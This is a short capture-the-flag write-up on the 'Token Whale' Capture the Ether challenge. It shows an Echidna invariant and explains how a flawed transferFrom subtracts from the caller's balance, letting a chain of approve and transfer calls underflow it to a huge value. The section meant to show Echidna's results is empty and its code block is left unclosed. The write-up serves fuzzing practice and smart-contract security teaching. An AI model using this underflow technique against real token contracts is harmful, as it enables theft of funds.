## Token Whale Capture the Ether challenge and Echidna

### Challenge
The Token Whale contracts is an ERC20-compatible hard to acquire token. Thereâ€™s a fixed supply of 1,000 tokens, all of which are user's to start with. Find a way to accumulate at least 1,000,000 tokens to solve this challenge.

### What was it testing?
The specific invariant being checked was the player's balance. In order to break the CTF we needed to violate the condition of a user's balance limit of 1,000,000, therefore this was the function:
```
    function echidna_isCompleted() public view returns (bool) {

        return balanceOf[player] <= 1000000;
    }
```

### Echidna results
The tool found this path to achieve the condition violation:

```

### Results interpretation
The real trick to solve this challenge is to underflow an user's balance by performing a transfer that will execute `balanceOf[msg.sender] -= value;`. To better understand echidna results let's remember this function signatures: `approve(address spender, uint256 value)`, `transferFrom(address from, address to, uint256 value)`, and `transfer(address to, uint256 value)`. Let's go through the calls:

1. The approve function doesnt require the approved value to be less than the actual balance, that's why the caller could make that `approve` call with such a large number.(msg.sender in this tx: address(3))
2. Since address(2) has an allowance by address(3) it can can bypass the requires, but when `transferFrom` calls `_transfer` it doesnt subtract from the `from` parameter sent to `transferFrom` but from the msg.sender's balance effectively underflowing.
3. address(2) transfers a big amount to address(1).
4. address(1) is able to transfer a big amount to address(3).
